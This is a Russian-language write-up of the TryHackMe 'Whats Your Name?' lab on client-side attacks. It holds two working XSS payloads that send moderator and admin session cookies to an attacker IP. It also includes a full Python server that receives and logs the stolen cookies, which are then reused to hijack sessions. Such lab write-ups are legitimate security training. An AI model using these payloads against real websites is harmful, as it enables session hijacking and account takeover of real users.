# WriteUp 'Whats Your Name?'

*   **Author:** VIVI
*   **Link:** [Whats Your Name?](https://tryhackme.com/room/whatsyourname)

## 🧠 Analysis

Описание данной комнаты: 

Utilise your client-side exploitation skills to take control of a web app.
This challenge will test client-side exploitation skills, from inspecting Javascript to manipulating cookies to launching CSRF/XSS attacks.

Комната проверяет навыки эксплуатации CSRF/XSS
## 🔍 Enumeration

Нужно в хосты прописать:

IP worldwap.thm

При переходе на домен сразу открывается web-морда, более детальную разведку проводить не стал, зная уже чего от меня тут будут ждать

## 🧩 Exploitation

### Flag 1.

Попав на форму регистрации, обнаруживаю поле, потенциально уязвимое для XSS
<img width="1919" height="760" alt="image" src="https://github.com/user-attachments/assets/5281d8bc-16cb-472f-9da4-6de59c088032" />

Судя по надписи над формой "Your details will be reviewed by the site moderator." подозреваю что это будет Stored XSS

Первая же возникшая идея, украсть куки модератора для дальнейшей авторизации.

Payload: 
```
<script>
fetch('http://IP:8000/steal?cookie=' + document.cookie);
</script>
```
Python сервер для принятия cookie:
``` server.py
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from datetime import datetime
import json

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Парсим URL
        parsed_url = urlparse(self.path)
        
        if '/steal' in parsed_url.path:
            # Получаем параметры запроса
            query_params = parse_qs(parsed_url.query)
            
            # Извлекаем cookie
            cookies = query_params.get('cookie', [''])[0]
            
            if cookies:
                # Логируем в файл
                with open('stolen_cookies.txt', 'a', encoding='utf-8') as f:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    f.write(f"[{timestamp}] {cookies}\n")
                
                # Выводим в консоль
                print(f"🎯 Получены cookie: {cookies}")
            
            # Отправляем ответ
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'OK')
        else:
            self.send_response(404)
            self.end_headers()

def run_server(port=8000):
    server_address = ('', port)
    httpd = HTTPServer(server_address, RequestHandler)
    print(f"🚀 Сервер запущен на порту {port}")
    print("📝 Ожидаем cookie...")
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
```

После отправки payload'а на сервер, ждем какое то время и получаем куки:
<img width="971" height="103" alt="image" src="https://github.com/user-attachments/assets/566e6e73-d235-4f4e-aedd-8b6ab554e2c4" />

Вставляем cookie себе, обновляем страницу и попадаем на форму /dashboard.php модератора

Если вводить данные в поля и пытаться отправить их - ничего не получится, выходит ошибка "Sharing your thoughts feature is currently disabled."

Однако здесь мы можем увидеть одну заметку модератора с подсказкой:
<img width="1912" height="728" alt="image" src="https://github.com/user-attachments/assets/041c4ab1-7e23-4dad-8e10-363e740df559" />

Следуя подсказке добавляем в /etc/hosts новый домен login.worldwap.thm и переходим на него

Открывается пустая страница, заглянем в код и найдем еще одну наводку:
<img width="1919" height="731" alt="image" src="https://github.com/user-attachments/assets/1d18a2e7-b0c0-497d-9dd5-777a811d28c2" />

Пробуем перейти по login.worldwap.thm/login.php (не забываем поменять куки на модераторские)

Мы попадаем в профиль модератора и получаем первый флаг:
<img width="1919" height="795" alt="image" src="https://github.com/user-attachments/assets/6f58a1e6-bc24-404c-bb09-e2db847debc3" />

### Flag 2

Заходим в чаты и видим чат с админом
<img width="1914" height="893" alt="image" src="https://github.com/user-attachments/assets/d39c24d3-e06c-4d91-9ccb-8d5c1e909bfe" />

Проворачиваем ту же самую схему с кражей куки, но необходимо подредактировать payload под DOM BASED XSS и отправить его в чат с админом

Payload:
```
<script>var i=new Image(); i.src="//IP/?cookie="+document.cookie;</script>
```

Видим что все отработало как надо:
<img width="1919" height="882" alt="image" src="https://github.com/user-attachments/assets/5da40364-c9d3-422f-b8d3-6837ec99a5a8" />

И получаем куки Админа (первые куки мои так как обновил страницу)
<img width="959" height="124" alt="image" src="https://github.com/user-attachments/assets/e7bba791-9b09-4c96-b401-ae78794486e5" />

Заменяем куки у себя в браузере и получаем второй флаг:
<img width="1913" height="882" alt="image" src="https://github.com/user-attachments/assets/5a657481-1b61-4580-a0aa-3a289e5be90c" />

## 💡 Conclusions

Несмотря на ранг Medium достаточно приятная, не душная комната, которая проверяет знания в Client-Side Attacks

В итоге я использовал Stored XSS, DOM Based XSS, CSRF - как и задумывалось создателями комнаты.
